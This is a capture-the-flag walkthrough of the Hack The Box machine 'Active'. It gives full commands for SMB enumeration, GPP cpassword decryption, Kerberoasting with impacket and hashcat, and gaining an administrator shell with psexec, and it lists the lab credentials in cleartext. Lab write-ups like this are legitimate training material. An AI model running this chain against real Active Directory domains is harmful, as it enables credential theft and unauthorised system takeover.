# Active

# Recon

## Machine IP Setup

First, we setup the target IP and run AutoRecon on it:

```powershell
export IP=10.10.10.100
```

```bash
autorecon $IP -v
```

## Initial Results

The initial results we obtain are as follows:

The Ports that are open include:

- 53 domain; Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
-dns-nsid:
    - bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
- 88 kerberos-sec; Microsoft Windows Kerberos (server time: 2021-12-22 10:52:23Z)
- 135 msrpc; Microsoft Windows RPC
- 139 netbios-ssn; Microsoft Windows netbios-ssn
- 389 ldap; Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
- 445 microsoft-ds?;
- 464 kpasswd5?;
- 593 ncacn_http; Microsoft Windows RPC over HTTP 1.0
- 636 tcpwrapped;
- 3268 ldap; Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
- 3269 tcpwrapped;
- 49152 msrpc; Microsoft Windows RPC
- 49153 msrpc; Microsoft Windows RPC
- 49154 msrpc; Microsoft Windows RPC
- 49155 msrpc; Microsoft Windows RPC
- 49157 ncacn_http; Microsoft Windows RPC over HTTP 1.0
- 49158 msrpc; Microsoft Windows RPC

# Enumeration (Service Version Check)

Nmap Vuln Scan:

```bash
nmap --script vuln -oA vuln $IP
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled.png)

Running the nmap vulnerability scan does not seem to yield any results.

DNS Enumeration:

Since we have DNS open, we can first look at the dns reverse lookup that runs automatically with autorecon:

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%201.png)

However, we do not seem to get any valid results. 

We can then try to set our default DNS server to port 53 and perform NS resolutions using nslookup:

```jsx
nslookup
server 10.10.10.100
10.10.100
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%202.png)

Beyond that, we can also attempt to perform a zone transfer request:

```jsx
dig AXFR -p 53 @10.10.10.100
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%203.png)

It seems that we have no leads from enumerating the DNS server.

From the nmap scan we conducted, however, we can tell from port 389 running LDAP that the domain is named active.htb. Therefore, we can append this resolution to /etc/hosts using:

```jsx
echo "10.10.10.100 active.htb" >> /etc/hosts
```

An Educated Guess:

From the name of the box and the services available (kerberos, DNS, LDAP), we can surmise that we are working with a Active Directory box. 

While it did not show up clearly on the nmap scan, ports 139 and 445 usually indicate that a SMB service is available.

SMB enumeration

To enumerate it, we can first look at what we can find using smbmap:

```bash
smbmap -H active.htb
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%204.png)

As we did not provide any credentials when running smbmap, the permissions displayed are for anonymous users. We can see that we have read only access to the disk REPLICATION, while we do not have any access to the other disks.

Thus, we can attempt to log on anonymously to the disk with smbclient:

```bash
smbclient //active.htb/Replication -N
```

And our anonymous login attempt succeeds:

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%205.png)

We can then do a recursive lookup of all the files on the disk with the following command:

```bash
smbmap -R Replication -H active.htb --depth 6
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%206.png)

From the above truncated screenshot of the output, we can see a interesting file, Groups.xml.

Groups.xml is a GPP file that is likely to be vulnerable to the GPP cPassword vulnerability:

GPP sometimes store passwords and usernames, which are encrypted with AES. However, the encryption key was made public and anyone can decrypt the passwords and usernames encrypted with the leaked key.

We can downloading the file using the following command to see if it contains cPasswords:

```bash
smbmap -R Replication -H active.htb --depth 6 -A "Groups.xml" -q
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%207.png)

Viewing the contents of the file, we do indeed see the cPassword for SVC_TGS

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%208.png)

# Initial Foothold

To crack this password, we can simply use gpp-decrypt that automatically comes with Kali:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%209.png)

Now that we have a valid set of credentials, SVC_TGS:GPPstillStandingStrong2k18, we can see the access we currently have with these credentials again:

```bash
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H $IP
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%2010.png)

# User Flag

This gives us access to the Users share, and we can use smbmap to find and download our user flag:

```bash
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -R Users -H active.htb --depth 10 -A "user.txt" -q
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%2011.png)

# Root Flag

Since this box is based on AD, and Kerberos is available, we can attempt Kerberoasting using the credentials that we just got.

Kerberoasting is an attack on the Kerberos service, which is an authentication protocol. A simplified explanation of attack is 

- With a valid set of user credentials, we can make requests for ticket-granting service (TGS) service tickets.
- These tickets, when used legitimately, allows the user to request for access to a service instance, identified by a Service Principal Name (SPN), from the domain controller.
- For security, TGS tickets are encrypted with the password hash of the service account whose context the service instance is run in.
- Therefore, Kerberoasting involves requesting a TGS ticket from available SPNs, and attempting to crack the password hash and as such obtain the password, of the service accounts running them, allowing us lateral or even vertical movement.

Hence, we will first use the [GetUserSPNs.py](http://GetUserSPNs.py) script from [impacket](https://github.com/SecureAuthCorp/impacket) to get TGS tickets:

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%2012.png)

We see that we have a ticket from a service account named “Administrator”, which is great news.

We can save the entire ticket into a file named “ticket.txt” and attempt to crack it via Hashcat:

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%2013.png)

```bash
hashcat -m 13100 ticket.txt /usr/share/wordlists/rockyou.txt -O
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%2014.png)

Hashcat succeeds, and we now we have a new set of credentials, Administrator:Ticketmaster1968.

Using the same method as before, we check our access to the different shares:

```bash
smbmap -d active.htb -u Administrator -p Ticketmaster1968 -H $IP
```

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%2015.png)

With read and write access to the ADMIN$ share, we can use [psexec.py](http://psexec.py) to gain a root shell:

```bash
psexec.py active.htb/Administrator@$IP
```

When requested for the password, provide the one we have just got as shown below, and we will get a root shell:

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%2016.png)

To find the root flag from there, we simply cd to the C drive and run the dir command, followed by the type command as follows:

![Untitled](Active%2072aced6f66d14ba79f9e46ab3a3d4bb4/Untitled%2017.png)

# Learning Points (Additional Points)

- We can find out the domain of the AD service by looking at nmap scan results for services such as LDAP
- `sudo killall openvpn` fixes the reconnecting issue
- dir FILE_NAME /s does not always give the same output